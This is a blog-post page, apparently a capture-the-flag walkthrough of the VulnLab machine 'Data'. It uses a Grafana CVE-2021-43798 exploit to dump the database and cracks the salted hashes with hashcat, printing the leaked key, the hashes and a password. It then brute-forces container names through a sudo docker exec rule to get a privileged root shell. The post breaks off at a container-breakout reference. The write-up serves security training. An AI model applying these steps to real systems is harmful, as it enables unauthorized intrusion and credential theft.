@@ -1,0 +1,575 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <!-- bing -->
+  <meta name="msvalidate.01" content="D6E6F0AB3EAD6BA4F5541EDCB8EEDCC5" />
+
+  <!-- toc.js -->
+  <script src='/js/toc.js'> </script>
+  <script>
+  window.addEventListener('hexo-blog-decrypt', function(event) {
+    setTimeout(() => {
+      makeList({
+       'target': '#toc',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+
+      makeList({
+       'target': '#toc-mobile',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+    }, 1000);
+  });  
+  </script>
+  
+  <!-- mane defined -->
+  <script>
+    function scriptOnError(errorMsg){
+      try{ document.body.innerHTML = ""; }catch{}
+      document.write("<h1>Error: Loading script error. </h1>");
+      document.write("<p>Some script loading error, Please Disable AD Block and retry again.</p>");
+      document.write("<p>很抱歉，有些脚本似乎無法正常加載，請嘗試關閉 AD Block 再試一次。</p>");
+      document.write("<p>Error on loading: ");
+      document.write(errorMsg);
+      document.write("</p>");
+
+      window.stop ? window.stop() : document.execCommand("Stop");
+    }
+  </script>
+
+  <!-- GTM -->
+  <script>
+    if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+          'https://www.googletagmanager.com/gtm.js?id='+i+dl;
+          f.parentNode.insertBefore(j,f);
+          })(window,document,'script','dataLayer','GTM-T952MB6B');
+    }
+  </script>
+
+  <!-- clarity -->
+  <script type="text/javascript">
+      (function(c,l,a,r,i,t,y){
+          c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+          t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+          y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+      })(window, document, "clarity", "script", "ph6eztilds");
+  </script>
+
+  <!-- check baseurl -->
+  <script>
+    setInterval( ()=>{
+      if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+          window.location.href = "https://manesec.github.io" + window.location.pathname;
+      }
+    }, 500);
+  </script>
+
+   <!-- fancybox support -->
+   
+     
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+   
+
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="​​ https:&#x2F;&#x2F;api.vulnlab.com&#x2F;api&#x2F;v1&#x2F;share?id&#x3D;9a0f7b4e-9b36-44d3-869d-758195350d3d nmap 掃描後，發現一個 Grafana 框架。通過檢查版本信息，確認存在 CVE-2021-43798 漏洞，利用相關漏洞項目進行攻擊，成功執行後獲得了 Grafana 的資料庫文件，其中包含了加鹽的帳號密碼。接著，使用工具将其破解，獲">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnLab - Machine - Data">
+<meta property="og:url" content="https://manesec.github.io/2025/01/01/2025/03-vulnlab-data/index.html">
+<meta property="og:site_name" content="Mane">
+<meta property="og:description" content="​​ https:&#x2F;&#x2F;api.vulnlab.com&#x2F;api&#x2F;v1&#x2F;share?id&#x3D;9a0f7b4e-9b36-44d3-869d-758195350d3d nmap 掃描後，發現一個 Grafana 框架。通過檢查版本信息，確認存在 CVE-2021-43798 漏洞，利用相關漏洞項目進行攻擊，成功執行後獲得了 Grafana 的資料庫文件，其中包含了加鹽的帳號密碼。接著，使用工具将其破解，獲">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/03-vulnlab-Data/image-20241230022000-2obec06.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/03-vulnlab-Data/image-20241230012957-6ri7ce9.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/03-vulnlab-Data/image-20241230015716-qh3gqbx.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/03-vulnlab-Data/image-20241230015636-6asto9m.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/03-vulnlab-Data/image-20241231032806-ztwoxwo.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/03-vulnlab-Data/image-20241230015742-e7ew6vn.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/03-vulnlab-Data/image-20241231033036-6oi49g3.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/03-vulnlab-Data/image-20241231033322-h452eaz.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/03-vulnlab-Data/image-20241231033343-1hr7t0v.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/03-vulnlab-Data/image-20241230020532-dzd1mmz.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/03-vulnlab-Data/image-20241230020836-66a5536.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/03-vulnlab-Data/image-20241230020925-q44r9mm.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/03-vulnlab-Data/image-20241230022058-glbcywk.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/03-vulnlab-Data/image-20241230021452-rck4r3e.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/03-vulnlab-Data/image-20241230021850-1deri4c.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/03-vulnlab-Data/image-20241230022142-ea2j1ub.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/03-vulnlab-Data/image-20241230022153-obke8r0.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/03-vulnlab-Data/image-20241230022243-24050h5.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/03-vulnlab-Data/image-20241230022432-p66c0uk.png">
+<meta property="article:published_time" content="2024-12-31T19:16:00.000Z">
+<meta property="article:modified_time" content="2024-12-31T19:18:30.888Z">
+<meta property="article:author" content="manesec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://relay-img.manesec.com/maneblog/2025/03-vulnlab-Data/image-20241230022000-2obec06.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>VulnLab - Machine - Data</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T952MB6B"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8C677QTBX9"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8C677QTBX9');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/01/01/2025/04-vulnlab-down/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/01/01/2025/02-vulnlab-build/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2025/01/01/2025/03-vulnlab-data/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2025/01/01/2025/03-vulnlab-data/&text=VulnLab - Machine - Data"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2025/01/01/2025/03-vulnlab-data/&title=VulnLab - Machine - Data"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2025/01/01/2025/03-vulnlab-data/&is_video=false&description=VulnLab - Machine - Data"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VulnLab - Machine - Data&body=Check out this article: https://manesec.github.io/2025/01/01/2025/03-vulnlab-data/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2025/01/01/2025/03-vulnlab-data/&title=VulnLab - Machine - Data"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2025/01/01/2025/03-vulnlab-data/&title=VulnLab - Machine - Data"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2025/01/01/2025/03-vulnlab-data/&title=VulnLab - Machine - Data"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2025/01/01/2025/03-vulnlab-data/&title=VulnLab - Machine - Data"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2025/01/01/2025/03-vulnlab-data/&name=VulnLab - Machine - Data&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2025/01/01/2025/03-vulnlab-data/&t=VulnLab - Machine - Data"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc"></div>
+    <style>
+    	#toc {
+	}
+    	#toc ul {
+	   display: grid ! important;
+	}
+    	#toc li {
+	   margin: 0 0 0 0 ! important;  
+	}
+	#toc .level-1 {
+	   font-size: 0.8rem;
+	   color: #ffffff ;
+	   background: #2bbc8ae5;
+	   padding-left: 3px;
+           padding-right: 3px;
+	}
+
+
+	#toc .level-1:hover {
+	   background: #00b4ddc7;
+	   color: #ffffff !important;
+	}
+
+	#toc .level-2 {
+	   font-size: 0.8rem;
+	   color: #2bbc8a;
+	}
+	#toc .level-3 {
+	   font-size: 0.7rem;
+	   color: #40474b;
+	}
+	#toc .level-4 , #toc .level-5, #toc .level-6 {
+	   font-size: 0.6rem;
+	   color: #8c8c8c;
+	}
+    </style>
+    
+    
+      <script>
+      	setTimeout(() => {
+	  makeList({
+	     'target': '#toc',   // Selector for element to place table of contents
+	     'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+	  });
+	}, 1000);
+      </script>
+     
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        VulnLab - Machine - Data
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">manesec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-12-31T19:16:00.000Z" class="dt-published" itemprop="datePublished">2025-01-01</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>​<img src="https://relay-img.manesec.com/maneblog/2025/03-vulnlab-Data/image-20241230022000-2obec06.png" alt="image">​</p>
+<p><a target="_blank" rel="noopener" href="https://api.vulnlab.com/api/v1/share?id=9a0f7b4e-9b36-44d3-869d-758195350d3d">https://api.vulnlab.com/api/v1/share?id=9a0f7b4e-9b36-44d3-869d-758195350d3d</a></p>
+<p>nmap 掃描後，發現一個 Grafana 框架。通過檢查版本信息，確認存在 CVE-2021-43798 漏洞，利用相關漏洞項目進行攻擊，成功執行後獲得了 Grafana 的資料庫文件，其中包含了加鹽的帳號密碼。接著，使用工具将其破解，獲得密碼后以特定用戶通過 SSH 登入系統，进一步取得了類似的 root 權限。透過檢查 sudo 權限，發現可以執行 docker 命令，從而利用該權限在容器中執行特權操作。為了取得系統最高權限，使用爆破技術確定了 docker 容器 ID，成功進入容器後，通過特權模式掛載整個系統的分區，檢索到 root 目錄的敏感文件，進而在掛載目錄中通過設置 SUID 方式，取得外部 shell 訪問的控制，從而完整地破解目標系統。</p>
+<h1 id="Nmap-scan"><a href="#Nmap-scan" class="headerlink" title="Nmap scan"></a>Nmap scan</h1><p>首先使用 nmap 掃描一下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE REASON         VERSION</span><br><span class="line">22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 95:5e:68:3e:b0:83:74:90:3d:85:2b:f9:73:e0:28:f0 (RSA)</span><br><span class="line">| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCrezQOBD4JmY/AcBzKSMsjdJIX3R5X44yXBjNEM4JfaXVM4a45+y7ZsfmAEsuIZ9OohtFjxKoiySY5WMSueX2H4Mg3+Nir40TM5RiGAxmQ8owU04BfD6GuGxm7cpZ6xfwvWYY1J7YzyfYhpxJPjGgN3XW/LpsqXUo0Dd/yhODx/mJONGXE6rZHx9Hie4D3fFRwG0UBjqr14WS4yad2OtnKiWskafhwZwg9maTDYMxJGQHnA7Ef+VKaKMdl4X/SALUZpMo4XOtdya0/dlgXIIq+zpHUt606ZzRkMZ/9Qsc2xT4gRICW+Y4UvYOn81kCOwlHZQz0HMAAuRyG7DCpE81Z</span><br><span class="line">|   256 2c:13:ae:4e:88:f6:6b:42:8a:d8:89:ca:6d:ec:b2:35 (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBB9KYsiH85JjoibCFqCgg66vpFqlBa06oNVFBw+JrQOHT2Hwl/WQlbczgkgCSIUB2pE6w3Og9ctmvku44sRpQnU=</span><br><span class="line">|   256 07:32:92:74:15:f3:9d:4d:b2:77:95:9f:69:4e:<span class="built_in">df</span>:68 (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBuAPp/amFREXnH+gXHA3cT6bBM7g0NTY6h7/l4fyfBQ</span><br><span class="line">3000/tcp open  ppp?    syn-ack ttl 62</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:</span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Content-Type: text/plain; charset=utf-8</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Request</span><br><span class="line">|   GetRequest:</span><br><span class="line">|     HTTP/1.0 302 Found</span><br><span class="line">|     Cache-Control: no-cache</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Expires: -1</span><br><span class="line">|     Location: /login</span><br><span class="line">|     Pragma: no-cache</span><br><span class="line">|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax</span><br><span class="line">|     X-Content-Type-Options: nosniff</span><br><span class="line">|     X-Frame-Options: deny</span><br><span class="line">|     X-Xss-Protection: 1; mode=block</span><br><span class="line">|     Date: Sun, 29 Dec 2024 17:13:43 GMT</span><br><span class="line">|     Content-Length: 29</span><br><span class="line">|     href=<span class="string">&quot;/login&quot;</span>&gt;Found&lt;/a&gt;.</span><br><span class="line">|   HTTPOptions:</span><br><span class="line">|     HTTP/1.0 302 Found</span><br><span class="line">|     Cache-Control: no-cache</span><br><span class="line">|     Expires: -1</span><br><span class="line">|     Location: /login</span><br><span class="line">|     Pragma: no-cache</span><br><span class="line">|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax</span><br><span class="line">|     X-Content-Type-Options: nosniff</span><br><span class="line">|     X-Frame-Options: deny</span><br><span class="line">|     X-Xss-Protection: 1; mode=block</span><br><span class="line">|     Date: Sun, 29 Dec 2024 17:13:49 GMT</span><br><span class="line">|_    Content-Length: 0</span><br></pre></td></tr></table></figure>
+
+<p>有一個 3000 端口是開著的。</p>
+<h1 id="Exploit-Grafana-with-CVE-2021-43798"><a href="#Exploit-Grafana-with-CVE-2021-43798" class="headerlink" title="Exploit Grafana with CVE-2021-43798"></a>Exploit Grafana with CVE-2021-43798</h1><p>打開3000端口后，是一個 Grafana 的框架：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/03-vulnlab-Data/image-20241230012957-6ri7ce9.png" alt="image">​</p>
+<p>在最下面有個版本，所以直接搜索一下 exploit：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/03-vulnlab-Data/image-20241230015716-qh3gqbx.png" alt="image">​</p>
+<p>從第一條結果中看到這個版本存在 <code>CVE-2021-43798</code>​ ，它的項目地址是： <a target="_blank" rel="noopener" href="https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798/">https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798/</a></p>
+<p>決定 clone 下來試一試，由於這個軟件只能傳遞一個文本，把目標放在文本上，運行之後傳遞文本名就得到：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&#x27;http://10.10.101.1:3000&#x27;</span> &gt; target.txt </span><br><span class="line">$ python3 exploit.py</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/03-vulnlab-Data/image-20241230015636-6asto9m.png" alt="image">​</p>
+<p>可以看到這個 CVE 是工作的，也就是存在 LFI 漏洞，這裏也得到了 Secret Key：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SW2YcwTIb9zpOOhoPsMm</span><br></pre></td></tr></table></figure>
+
+<p>運行完成之後，exp目錄下就會生成一個文件夾：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/03-vulnlab-Data/image-20241231032806-ztwoxwo.png" alt="image">​</p>
+<p>其中 <code>grafana.db</code>​ 裏面存放了登錄用到的賬號密碼：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/03-vulnlab-Data/image-20241230015742-e7ew6vn.png" alt="image">​</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin	admin@localhost		7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8	YObSoLj55S	hLLY6QQ4Y6</span><br><span class="line">boris	boris@data.vl	boris	dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8	LCBhdtJWjl	mYl941ma8w</span><br></pre></td></tr></table></figure>
+
+<h2 id="Cracking-hash-from-grafana-db"><a href="#Cracking-hash-from-grafana-db" class="headerlink" title="Cracking hash from grafana.db"></a>Cracking hash from grafana.db</h2><p>由於有鹽的形式存在，如果要破解這個hash，就需要找到一個方法把他變成  hashcat 支持的格式，</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/03-vulnlab-Data/image-20241231033036-6oi49g3.png" alt="image">​</p>
+<p>之後找到了這個：<a target="_blank" rel="noopener" href="https://github.com/repo4Chu/grafana-password-decrypt">https://github.com/repo4Chu/grafana-password-decrypt</a></p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/03-vulnlab-Data/image-20241231033322-h452eaz.png" alt="image">​</p>
+<p>然後根據項目文檔：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/03-vulnlab-Data/image-20241231033343-1hr7t0v.png" alt="image">​</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 10900 hashes.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/03-vulnlab-Data/image-20241230020532-dzd1mmz.png" alt="image">​</p>
+<p>跑一下之後就得到了一個密碼：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=:beautiful1</span><br></pre></td></tr></table></figure>
+
+<h1 id="Shell-as-user-boris"><a href="#Shell-as-user-boris" class="headerlink" title="Shell as user boris"></a>Shell as user boris</h1><p>由於得到了一個密碼，不知道是哪個用戶的，嘗試登錄ssh，在使用 <code>boris</code>​ 的用戶去登錄就得到了 <code>user.txt</code>​ ：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/03-vulnlab-Data/image-20241230020836-66a5536.png" alt="image">​</p>
+<p>一開始拿到了shell，當然會看一下 <code>sudo -l</code>​：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/03-vulnlab-Data/image-20241230020925-q44r9mm.png" alt="image">​</p>
+<h2 id="Exploit-sudo-with-docker-exec"><a href="#Exploit-sudo-with-docker-exec" class="headerlink" title="Exploit sudo with docker exec"></a>Exploit sudo with docker exec</h2><p>看到可以使用 root 的命令運行 <code>/snap/bin/docker exec *</code>​，看一下有什麽參數：</p>
+<p>‍</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/03-vulnlab-Data/image-20241230022058-glbcywk.png" alt="image">​</p>
+<p>也就是說可以運行一些東西在容器裏面，比如我想在現有的容器上運行一個 bash， 我可以：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it &lt;容器ID&gt; /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>那麽問題來了，由於不知道docker 容器裏的ID可以直接爆破。</p>
+<h2 id="Guessing-container-name"><a href="#Guessing-container-name" class="headerlink" title="Guessing container name"></a>Guessing container name</h2><p>如果你熟悉docker 命令，在指定容器的名字中，可以只打一開始的容器名字，當你使用 <code>docker ps -a -q</code>​ 查看容器的ID時，你會得到：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ sudo docker ps -a -q</span><br><span class="line">a1b2c3d4e5f6</span><br><span class="line">f7g8h9i0j1k2</span><br><span class="line">l3m4n5o6p7q8</span><br><span class="line">r9s0t1u2v3w4</span><br><span class="line">ras2t1u2v3w4</span><br><span class="line">x5y6z7a8b9c0</span><br><span class="line">d1e2f3g4h5i6</span><br><span class="line">j7k8l9m0n1o2</span><br><span class="line">p3q4r5s6t7u8</span><br><span class="line">v9w0x1y2z3a4</span><br><span class="line">b5c6d7e8f9g0</span><br></pre></td></tr></table></figure>
+
+<p>如果我想要得到第一個容器，也就是 <code>a1b2c3d4e5f6</code>​，我可以只打開頭的幾個字符，比如 <code>a</code>​、<code>a1</code>​、<code>a1b</code>​這樣。</p>
+<p>也就是 <code>docker exec -it a /bin/bash</code>​ 或者 <code>docker exec -it a1 /bin/bash</code>​ 也代表 <code>a1b2c3d4e5f6</code>​ 。</p>
+<p>但如果他存在兩個結果，就會報錯。比如上面的例子中開頭有兩個 <code>r</code>​，</p>
+<p>如果你打 <code>docker exec --it r /bin/bash</code>​，由於不知道你説的是<code>r9s0t1u2v3w4</code>​ 還是 <code>ras2t1u2v3w4</code>​ ，就會不讓你運行。</p>
+<p>‍</p>
+<p>既然知道了原理，就可以從 0-9 a-z 來爆破看看：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">boris@ip-10-10-10-11:~$ <span class="keyword">for</span> i <span class="keyword">in</span> &#123;0..9&#125; ; <span class="keyword">do</span> sudo /snap/bin/docker <span class="built_in">exec</span> -it <span class="variable">$i</span> sh ; <span class="keyword">done</span> </span><br><span class="line">boris@ip-10-10-10-11:~$ <span class="keyword">for</span> i <span class="keyword">in</span> &#123;a..z&#125; ; <span class="keyword">do</span> sudo /snap/bin/docker <span class="built_in">exec</span> -it <span class="variable">$i</span> sh ; <span class="keyword">done</span> </span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/03-vulnlab-Data/image-20241230021452-rck4r3e.png" alt="image">​</p>
+<p>結果在 e 的時候成功進去了一個容器裏面。</p>
+<h2 id="Run-command-and-exploit-privileged-mode-on-the-container"><a href="#Run-command-and-exploit-privileged-mode-on-the-container" class="headerlink" title="Run command and exploit privileged mode on the container"></a>Run command and exploit privileged mode on the container</h2><p>另外在 <code>docker exec</code>​ 中可以指定特權用戶運行一些東西：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo /snap/bin/docker <span class="built_in">exec</span> -it --privileged -u root e sh</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/03-vulnlab-Data/image-20241230021850-1deri4c.png" alt="image">​</p>
+<p>所以可以參考 <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation#privileged">hacktricks</a>：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/03-vulnlab-Data/image-20241230022142-ea2j1ub.png" alt="image">​</p>
